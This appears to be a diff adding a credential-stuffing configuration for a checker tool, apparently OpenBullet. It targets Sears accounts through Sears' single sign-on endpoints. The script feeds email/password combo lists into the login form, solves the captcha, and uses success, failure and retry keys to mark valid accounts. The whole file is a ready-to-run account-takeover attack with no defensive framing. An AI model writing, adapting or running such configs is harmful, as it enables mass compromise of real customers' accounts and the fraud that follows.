@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Sears",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-04T12:25:47.6714503+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.sears.com/universalprofile/userLogonForm?upid=3&formName=LOGIN&URL=http%3A%2F%2Fwww.sears.com%2Fen_intnl%2Fdap%2Fshopping-tourism.html" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#GET_USERSTATE REQUEST POST "https://sso.shld.net/shccas/usr/userstate.htm" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&sid=3" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "Origin: https://sso.shld.net" 
+  HEADER "referer: https://sso.shld.net/shccas/usr/loginform.htm?_flowId=regEnroll-flow&clienthost=www.sears.com&service=http%3A%2F%2Fwww.sears.com%2Fen_intnl%2Fdap%2Fshopping-tourism.html%3FstoreId%3D10153%26catalogId%3D12605&sid=3&fid=611ED350E9805E2B-1DA2F60F62291941&sywrequired=true&modifyservice=true&fullpage=true&irp=true&xdm_e=https%3A%2F%2Fwww.sears.com&xdm_c=default2159&xdm_p=1" 
+#VALIDATE REQUEST POST "https://sso.shld.net/shccas/usr/validate.htm" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&sid=3" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "Origin: https://sso.shld.net" 
+  HEADER "Referer: https://sso.shld.net/shccas/usr/loginform.htm?_flowId=regEnroll-flow&clienthost=www.sears.com&service=http%3A%2F%2Fwww.sears.com%2Fen_intnl%2Fdap%2Fshopping-tourism.html%3FstoreId%3D10153%26catalogId%3D12605&sid=3&fid=611ED350E9805E2B-1DA2F60F62291941&sywrequired=true&modifyservice=true&fullpage=true&irp=true&xdm_e=https%3A%2F%2Fwww.sears.com&xdm_c=default2159&xdm_p=1" 
+#PARSE_CAPTCHA_ID PARSE "<SOURCE>" CSS "[name=shc_data_field]" "value" 0 -> VAR "CAPTCHAID" "" "" 
+CAPTCHA "https://accounts.sears.com/universalservices/captcha/image?img=<CAPTCHAID>" Base64=FALSE SendScreenshot=FALSE -> VAR "CAPTCHA" 
+#URL_ENCODE_ID FUNCTION URLEncode "<CAPTCHAID>" -> VAR "UEID" 
+#LOGIN REQUEST POST "https://sso.shld.net/shccas/usr/loginhandler.htm" AutoRedirect=TRUE 
+  CONTENT "loginId=<USER>&logonPassword=<PASS>&sourceSiteId=3&service=https%3A%2F%2Fwww.sears.com%2FUSRLogon%3FstoreId%3D10153%26catalogId%3D12605%26langId%3D-1&redirectUrl=http%3A%2F%2Fwww.sears.com%2Fen_intnl%2Fdap%2Fshopping-tourism.html%3FstoreId%3D10153%26catalogId%3D12605&modifyservice=true&sywLogin=true&shcKey=<UEID>&shcResponse=<CAPTCHA>&tncmodal=false&clienthost=www.sears.com&renew=true&sywmax=&irp=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "Origin: https://sso.shld.net" 
+  HEADER "Referer: https://sso.shld.net/shccas/usr/loginform.htm?_flowId=regEnroll-flow&clienthost=www.sears.com&service=http%3A%2F%2Fwww.sears.com%2Fen_intnl%2Fdap%2Fshopping-tourism.html%3FstoreId%3D10153%26catalogId%3D12605&sid=3&fid=611ED350E9805E2B-1DA2F60F62291941&sywrequired=true&modifyservice=true&fullpage=true&irp=true&xdm_e=https%3A%2F%2Fwww.sears.com&xdm_c=default2159&xdm_p=1" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, your credentials have expired" 
+    KEY "we didn't recognize that email and password combination" 
+  KEYCHAIN Retry OR 
+    KEY "Sorry, your entry didn't match the challenge code shown" 
+  KEYCHAIN Success OR 
+    KEY "nonWCSStoreValue" 
